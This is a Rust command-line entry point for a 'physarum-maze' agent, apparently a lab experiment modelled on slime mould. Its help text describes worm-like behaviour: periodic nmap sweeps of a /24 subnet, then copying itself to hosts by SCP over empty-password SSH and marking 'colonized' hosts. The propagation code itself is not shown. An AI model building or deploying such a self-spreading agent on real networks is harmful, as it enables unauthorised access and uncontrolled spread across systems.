use clap::{Parser, ValueEnum};
use tracing_subscriber::EnvFilter;

mod agent;
mod discovery;
mod icmp;
mod lineage;
mod propagation;
mod tcp;

#[derive(Clone, Debug, ValueEnum)]
pub enum Mode {
    /// Entry point — starts on Host A, bootstraps lineage
    Seed,
    /// Propagated instance — receives lineage from parent via --lineage-b64
    Propagated,
}

#[derive(Parser, Debug)]
#[command(
    name = "physarum-maze",
    about = "PF-1/PF-2 self-propagating maze agent (physarum slime-mould model)",
    long_about = "Listens for ICMP echo requests and TCP SYN packets to port 22, \
                  runs periodic /24 nmap discovery, confirms SSH on discovered hosts, \
                  and propagates itself via SCP + empty-password SSH.  Detects already-\
                  colonized hosts and records secondary conduits.  Maintains a lineage \
                  JSON with D_ij path scores."
)]
pub struct Cli {
    /// Operating mode
    #[arg(long, default_value = "seed")]
    pub mode: Mode,

    /// Network interface to capture ICMP/TCP on (must match the maze subnet iface)
    #[arg(long, default_value = "eth0", env = "PHYSARUM_IFACE")]
    pub interface: String,

    /// Propagated mode: base64-encoded lineage JSON from parent host
    #[arg(long, env = "PHYSARUM_LINEAGE_B64")]
    pub lineage_b64: Option<String>,

    /// Maximum propagation depth — guards against infinite loops
    #[arg(long, default_value_t = 12, env = "PHYSARUM_MAX_HOPS")]
    pub max_hops: usize,

    /// Seconds without ICMP/TCP stimulus before the agent goes dormant
    #[arg(long, default_value_t = 120, env = "PHYSARUM_STIMULUS_TIMEOUT")]
    pub stimulus_timeout_secs: u64,

    /// Interval in seconds between periodic /24 nmap subnet discovery runs
    #[arg(long, default_value_t = 60, env = "PHYSARUM_DISCOVERY_INTERVAL")]
    pub discovery_interval_secs: u64,
}

#[tokio::main]
async fn main() -> anyhow::Result<()> {
    tracing_subscriber::fmt()
        .with_env_filter(
            EnvFilter::try_from_default_env().unwrap_or_else(|_| EnvFilter::new("info")),
        )
        .init();

    let cli = Cli::parse();
    agent::run(cli).await
}
